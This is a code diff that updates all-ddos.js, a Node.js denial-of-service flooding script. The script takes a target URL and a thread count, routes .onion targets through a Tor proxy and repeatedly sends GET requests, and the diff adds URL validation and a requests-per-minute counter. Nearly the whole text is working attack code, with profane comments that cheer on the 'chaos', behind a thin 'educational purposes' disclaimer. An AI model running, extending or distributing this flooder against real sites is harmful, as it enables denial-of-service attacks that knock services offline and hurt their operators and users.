@@ -1,6 +1,6 @@
 // WARNING: THIS TOOL IS FOR EXPERIMENTAL AND EDUCATIONAL PURPOSES ONLY.
 // MISUSE CAN RESULT IN SEVERE LEGAL CONSEQUENCES. USE AT YOUR OWN RISK.
-// THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS TOOL. FUCK IT UP. BIGMANCOZMO IS NOT RESPONSIBLE.
+// THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS TOOL. BIGMANCOZMO IS NOT RESPONSIBLE. FUCK IT UP.
 
 // DISCLAIMER: THIS TOOL IS CAPABLE OF CAUSING SIGNIFICANT DISRUPTION.
 // IT SHOULD NOT BE USED AGAINST SITES WITHOUT EXPLICIT PERMISSION.
@@ -11,18 +11,31 @@ const ddosLog = require('fs').createWriteStream('ddos_log.txt', { flags: 'a' });
 const crypto = require('crypto'); // for generating random shit
 const http = require('http'); // basic http
 const https = require('https'); // secure!
+const { URL } = require('url'); // For robust URL parsing
 
 const targetURL = process.argv[2]; // Get target URL from command line
 const threads = process.argv[3] || 10; // Number of threads (default 10)
 const onion = targetURL.includes('.onion'); // Is it a dark web site?
 const torProxy = 'socks5h://127.0.0.1:9050'; // Default Tor proxy, adjust if needed
+const maxRequestsPerMinute = process.argv[4] || 5000; // Limit requests per minute
 
 if (!targetURL) {
-    console.log(chalk.red.bold("Usage: node all-ddos.js <target_url> [threads]"));
+    console.log(chalk.red.bold("Usage: node all-ddos.js <target_url> [threads] [maxRequestsPerMinute]"));
     process.exit(1);
 }
 
-console.log(chalk.green.bold(`Starting DDoS attack on ${targetURL} with ${threads} threads. Prepare for some fucking chaos. Press Ctrl+C to stop.`));
+// Validate the target URL
+try {
+    new URL(targetURL); // Will throw an error if the URL is invalid
+} catch (error) {
+    console.log(chalk.red.bold(`Invalid URL: ${targetURL}.  This shit has to be a valid URL, you dumb fuck.`));
+    process.exit(1);
+}
+
+console.log(chalk.green.bold(`Starting DDoS attack on ${targetURL} with ${threads} threads. Cranking it to ${maxRequestsPerMinute} requests per minute. Prepare for some fucking chaos. Press Ctrl+C to stop.`));
+
+let requestCount = 0; // Initialize the request counter
+let lastMinuteStart = Date.now(); // Initialize the start time of the last minute
 
 function logAction(message) {
     const timestamp = new Date().toISOString();
@@ -53,25 +66,37 @@ function attack() {
     };
 
     const protocol = targetURL.startsWith('https') ? https : http; // Choose http or https
-    
+
     if (onion) {
         const SocksProxyAgent = require('socks-proxy-agent'); // Tor proxy agent
-        options.agent = new SocksProxyAgent(torProxy); // use tor proxy on .onion
-
+        options.agent = new (require('socks-proxy-agent'))({ protocol: 'socks5h:', host: '127.0.0.1', port: 9050 }); // use tor proxy on .onion
     }
-    
-    protocol.get(options, (res) => {
-        logAction(chalk.green(`Thread: ${threads} , Status Code: ${res.statusCode} , Target: ${targetURL} , Request was successful, but who fucking cares`));
-        res.on('data', () => {
-            //Consume the fucking data
-        });
-        res.on('end', () => {
-            //fuck, end of data
-        });
 
-    }).on('error', (err) => {
-        logAction(chalk.red(`Thread: ${threads} , Status Code: ${err.code} , Target: ${targetURL} , Request failed because this site is garbage. Error: ${err.message}`));
-    });
+    // Throttling mechanism
+    const now = Date.now();
+    if (now - lastMinuteStart > 60000) {
+        requestCount = 0; // Reset the counter if a minute has passed
+        lastMinuteStart = now;
+    }
+
+    if (requestCount < maxRequestsPerMinute) {
+        requestCount++;
+        protocol.get(options, (res) => {
+            logAction(chalk.green(`Thread: ${threads} , Status Code: ${res.statusCode} , Target: ${targetURL} , Request was successful, but who fucking cares`));
+            res.on('data', () => {
+                //Consume the fucking data
+            });
+            res.on('end', () => {
+                //fuck, end of data
+            });
+
+        }).on('error', (err) => {
+            logAction(chalk.red(`Thread: ${threads} , Status Code: ${err.code} , Target: ${targetURL} , Request failed because this site is garbage. Error: ${err.message}`));
+        });
+    } else {
+        // if request limit is reached
+        logAction(chalk.yellow("Request limit reached. Throttling this shit."));
+    }
 }
 
 function flood() {
